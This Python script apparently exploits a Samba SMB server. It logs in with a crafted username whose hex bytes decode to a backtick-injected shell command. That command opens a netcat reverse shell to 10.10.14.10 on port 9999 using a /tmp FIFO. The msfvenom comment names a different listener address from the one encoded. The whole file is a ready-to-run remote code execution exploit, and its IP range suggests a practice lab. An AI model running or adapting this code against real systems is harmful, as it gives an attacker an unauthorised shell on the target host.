#!/usr/bin/python
import smb
from smb.SMBConnection import SMBConnection
import random, string
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False
import sys



# Use the commandline argument as the target: 
if len(sys.argv) < 2:
    print("\nUsage: " + sys.argv[0] + " <HOST>\n")
    sys.exit()


# Shellcode: 
# msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.0.35 LPORT=9999 -f python

buf = b"\x2f\x3d\x60\x6e\x6f\x68\x75\x70\x20"
buf += b""
buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f"
buf += b"\x63\x68\x75\x64\x6d\x6a\x3b\x20\x6e\x63\x20\x31"
buf += b"\x30\x2e\x31\x30\x2e\x31\x34\x2e\x31\x30\x20\x39"
buf += b"\x39\x39\x39\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x63"
buf += b"\x68\x75\x64\x6d\x6a\x20\x7c\x20\x2f\x62\x69\x6e"
buf += b"\x2f\x73\x68\x20\x3e\x2f\x74\x6d\x70\x2f\x63\x68"
buf += b"\x75\x64\x6d\x6a\x20\x32\x3e\x26\x31\x3b\x20\x72"
buf += b"\x6d\x20\x2f\x74\x6d\x70\x2f\x63\x68\x75\x64\x6d"
buf += b"\x6a"
buf += b"\x60"

"""
username_before = "/=`nohup "
username_after_bytes = username_before.encode('utf-8')
username_after_hex = (username_after_bytes.hex()).encode('utf-8')
username_bytes = b"\x2f\x3d\x60\x6e\x6f\x68\x75\x70\x20"

tail_before = "`"
tail_after_bytes = tail_before.encode('utf-8')
tail_after_hex = (tail_after_bytes.hex()).encode('utf-8')
tail_bytes = b"\x60"
"""
username = buf

password = ""
conn = SMBConnection(username, password, "pentest" , "1qaz@WSX!QAZ", use_ntlm_v2 = False)
assert conn.connect(sys.argv[1], 445)